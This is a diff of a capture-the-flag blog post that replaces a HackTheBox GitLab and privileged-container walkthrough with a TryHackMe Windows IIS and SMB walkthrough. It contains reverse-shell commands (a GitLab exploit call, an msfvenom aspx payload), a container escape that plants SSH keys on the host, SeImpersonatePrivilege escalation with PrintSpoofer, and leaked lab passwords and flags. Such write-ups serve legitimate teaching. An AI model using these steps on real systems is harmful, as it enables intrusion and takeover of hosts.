@@ -9,139 +9,158 @@ header:
   teaser_home_page: true
   icon: /assets/images/thm.png
 categories:
-  - hackthebox
-  - infosec
+  - try hack me
 tags:
-  - linux
-  - gitlab
-  - cve
-  - docker
-  - privileged container
+  - Windows
+  - IIS
+  - privileged
+  - msfvenom
 ---
 
-![](/assets/images/thm-writeup-relevant/relevant1.png)
+![](/assets/images/thm-writeup-relevant/relevant1.PNG)
 
-Ready was a pretty straighforward box to get an initial shell on: We identify that's it running a vulnerable instance of Gitlab and we use an exploit against version 11.4.7 to land a shell. Once inside, we quickly figure out we're in a container and by looking at the docker compose file we can see the container is running in privileged mode. We then mount the host filesystem within the container then we can access the flag or add our SSH keys to the host root user home directory.
+You have been assigned to a client that wants a penetration test conducted on an environment due to be released to production in seven days. The client requests that an engineer conducts an assessment of the provided virtual environment. The client has asked that minimal information be provided about the assessment, wanting the engagement conducted from the eyes of a malicious actor (black box penetration test).  The client has asked that you secure two flags (no location provided) as proof of exploitation.
 
 ## Portscan
 
 ```
-sudo nmap -T4 -sC -sV -oA scan -p- 10.129.149.31
-Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-09 22:41 EDT
-Nmap scan report for 10.129.149.31
-Host is up (0.015s latency).
-Not shown: 65533 closed ports
-PORT     STATE SERVICE VERSION
-22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
-|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
-|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
-|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
-5080/tcp open  http    nginx
-| http-robots.txt: 53 disallowed entries (15 shown)
-| / /autocomplete/users /search /api /admin /profile 
-| /dashboard /projects/new /groups/new /groups/*/edit /users /help 
-|_/s/ /snippets/new /snippets/*/edit
-| http-title: Sign in \xC2\xB7 GitLab
-|_Requested resource was http://10.129.149.31:5080/users/sign_in
-|_http-trane-info: Problem with XML parsing of /evox/about
+nmap -sCV -p80,135,139,445,3389,49663,49667,49669 10.10.254.100
+Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-09 06:31 EST
+Nmap scan report for 10.10.254.100     
+Host is up (0.047s latency).
+                                                          
+PORT      STATE SERVICE       VERSION
+80/tcp    open  http          Microsoft IIS httpd 10.0
+|_http-title: IIS Windows Server              
+|_http-server-header: Microsoft-IIS/10.0
+| http-methods:                                                                                                      
+|_  Potentially risky methods: TRACE                                                                                 
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds  Windows Server 2016 Standard Evaluation 14393 microsoft-ds
+3389/tcp  open  ms-wbt-server Microsoft Terminal Services
+| ssl-cert: Subject: commonName=Relevant
+| Not valid before: 2022-12-08T11:23:33
+|_Not valid after:  2023-06-09T11:23:33
+|_ssl-date: 2022-12-09T11:33:07+00:00; +1s from scanner time.
+| rdp-ntlm-info: 
+|   Target_Name: RELEVANT
+|   NetBIOS_Domain_Name: RELEVANT
+|   NetBIOS_Computer_Name: RELEVANT
+|   DNS_Domain_Name: Relevant
+|   DNS_Computer_Name: Relevant
+|   Product_Version: 10.0.14393
+|_  System_Time: 2022-12-09T11:32:27+00:00
+49663/tcp open  http          Microsoft IIS httpd 10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: IIS Windows Server
+49667/tcp open  msrpc         Microsoft Windows RPC
+49669/tcp open  msrpc         Microsoft Windows RPC
+Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 1h36m01s, deviation: 3h34m41s, median: 0s
+| smb2-time: 
+|   date: 2022-12-09T11:32:30
+|_  start_date: 2022-12-09T11:23:49
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb-os-discovery: 
+|   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)
+|   Computer name: Relevant
+|   NetBIOS computer name: RELEVANT\x00
+|   Workgroup: WORKGROUP\x00
+|_  System time: 2022-12-09T03:32:31-08:00
+| smb2-security-mode: 
+|   311: 
+|_    Message signing enabled but not required
 ```
 
-## Gitlab
+## SMB
 
-The webserver on port 5080 runs a Gitlab instance.
+The target host on port 445 and 139 runs a SMB Server, we can list the content, cause the smb server has anonymous user enabled.
 
-![](/assets/images/htb-writeup-ready/gitlab1.png)
+![](/assets/images/thm-writeup-relevant/smblist.PNG)
 
-We have access to create a new account.
+We find a shared folder called nt4wrksv that we can access anonymously.
 
-![](/assets/images/htb-writeup-ready/gitlab2.png)
+![](/assets/images/thm-writeup-relevant/smbpasswords.PNG)
 
-Once logged in, we see in the projects list there's a single projet called *ready-channel*.
+Checking the content of passwords.txt file we can see 2 base64 encoded passwords, if we decode them, we get a pair of usernames and passwords.
 
-![](/assets/images/htb-writeup-ready/gitlab3.png)
+![](/assets/images/thm-writeup-relevant/smbdecoded.PNG)
 
-To check the Gitlab version we go to the Help section and we can see it's running 11.4.7.
+If we try to acces the machine with this credentials, we realize that they are not valid. At this point we need to start looking for another attack vector.
 
-![](/assets/images/htb-writeup-ready/gitlab5.png)
+## Web
 
-A quick search on Exploit-DB shows there's an authenticated remote code execution vulnerability for this exact version.
+Checking the nmap scan, we can see that the machine is hosting a web server on port's 80 and 49663, that we can access.
 
-![](/assets/images/htb-writeup-ready/gitlab6.png)
+![](/assets/images/thm-writeup-relevant/default.PNG)
 
-`python3 exploit.py -g http://10.129.149.31 -u snowscan2 -p yolo1234 -l 10.10.14.4 -P 4444`
+Both ports have the default IIS template, we can use a subdirectory enummeration tool like ffuf,wfuzz or gobuster in order to discover new files on the server.
 
-Reverse shell connection:
+`ffuf  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://X.X:X.X:49663/FUZZ -mc 200,301,303`
 
-![](/assets/images/htb-writeup-ready/shell.png)
+![](/assets/images/thm-writeup-relevant/ffuf.PNG)
 
-![](/assets/images/htb-writeup-ready/user.png)
+The subdirectory name in IIS, is the same as the shared resource in the smb server, they may be the same, so let's try to upload something into the smb folder and browse it in IIS.
 
-## Privesc
+![](/assets/images/thm-writeup-relevant/hellotxt.PNG)
 
-By running [linpeas.sh](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) we find a backup file with some SMTP credentials for the gitlab application. 
+As we can see below, we can acces the file that we just added into the SMB folder, this means that we can upload and execute files in the webserver.
 
-```
-Found /opt/backup/gitlab.rb
-gitlab_rails['smtp_password'] = "wW59U!ZKMbG9+*#h"
-```
+![](/assets/images/thm-writeup-relevant/iistxt.PNG)
 
-That password is the same password as the root password for the container so we can privesc locally inside the container.
+## Exploitation
 
-```
-git@gitlab:/opt/backup$ su -l root
-su -l root
-Password: wW59U!ZKMbG9+*#h
+IIS uses .asp and .aspx shell files to execute scripts, so im going to create a reverse shell payload with msfvenom in order to gain acces to the machine.
 
-root@gitlab:~# 
-```
+`sudo msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOURIP LPORT=LOCALPORT -f aspx -o reverse.aspx`
 
-There's a root_pass file in the root of the filesystem but that's not useful.
+![](/assets/images/thm-writeup-relevant/msfvenom.PNG)
 
-```
-cat /root_pass
-YG65407Bjqvv9A0a8Tm_7w
-```
+Once we have the payload in the SMB folder we can start a netcat listener and execute the reverse.aspx file on the web browser, and we retrive the reverse shell.\ 
+I used curl for this, but you can use your web browser.
 
-If we look at the `/opt/backup/docker-compose.yml` configuration file, we can see it's a hint that we're running in a privileged container:
+`curl -X GET http://10.10.36.237:49663/nt4wrksv/reverse.aspx`
 
-```
-    volumes:
-      - './srv/gitlab/config:/etc/gitlab'
-      - './srv/gitlab/logs:/var/log/gitlab'
-      - './srv/gitlab/data:/var/opt/gitlab'
-      - './root_pass:/root_pass'
-    privileged: true
-    restart: unless-stopped
-    #mem_limit: 1024m
-```
+![](/assets/images/thm-writeup-relevant/netcat.PNG)
 
-Privileged containers can access the host's disk devices so we can just read the root flag after mounting the drive.
+We can now go to Bob's desktop and retrive the user.txt 
 
-![](/assets/images/htb-writeup-ready/root.png)
+![](/assets/images/thm-writeup-relevant/flag.PNG)
 
-To get a proper shell in the host OS we can drop our SSH keys in the root's .ssh directory.
+`user.txt: THM{fdk4ka34vk346ksxfr21tg789ktf45}`
 
-```
-root@gitlab:~# mount /dev/sda2 /mnt
-mount /dev/sda2 /mnt
-root@gitlab:~# echo 'ssh-rsa AAAAB3NzaC1y[...]+HUBS+l32faXPc= snowscan@kali' > /mnt/root/.ssh/authorized_keys
+## Priv Esc
 
-[...]
+Now we have a shell in the machine, but we are not a privileged, our goal is to reach system user, so we need to find a way of scalate privileges. There are several ways of doing this, I will sow you the coolest one.
 
-$ ssh root@10.129.150.37
-The authenticity of host '10.129.150.37 (10.129.150.37)' can't be established.
-ECDSA key fingerprint is SHA256:7+5qUqmyILv7QKrQXPArj5uYqJwwe7mpUbzD/7cl44E.
-Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
-Warning: Permanently added '10.129.150.37' (ECDSA) to the list of known hosts.
-Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-40-generic x86_64)
+First of all, let's check our privileges as "apppool\defaultapppool" service account user. We can see that SeImpersonatePrivilege is enabled.
 
-[...]
+![](/assets/images/thm-writeup-relevant/priv.PNG)
 
-The list of available updates is more than a week old.
-To check for new updates run: sudo apt update
+If we search at [Hacktricks](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens#seimpersonateprivilege-3.1.1) we find 3 ways of exploting this privilege, juicy-potato, RogueWinRM (needs winrm disabled), SweetPotato and PrintSpoofer. 
 
-Last login: Thu Feb 11 14:28:18 2021
-root@ready:~# cat root.txt
-b7f98681505cd39066f67147b103c2b3
-```
+Im going to use the PrintSpoofer [exploit](https://github.com/itm4n/PrintSpoofer/releases/tag/v1.0)
+
+As we did with the .aspx file, upload the exploit in the smb folder.
+Once we uploaded the exploit we can use dir to find it.
+
+![](/assets/images/thm-writeup-relevant/dir.PNG)
+
+The las step is to execute the exploit, in my case I will use `PrintSpoofer64.exe -i -c cmd` to spawn a system shell.
+
+![](/assets/images/thm-writeup-relevant/execute.PNG)
+
+Now we are executing commands as "nt\authority system", navigate to Administrator Desktop to retrive the root.txt
+
+![](/assets/images/thm-writeup-relevant/root.PNG)
+
+`root:THM{1fk5kf469devly1gl320zafgl345pv}`
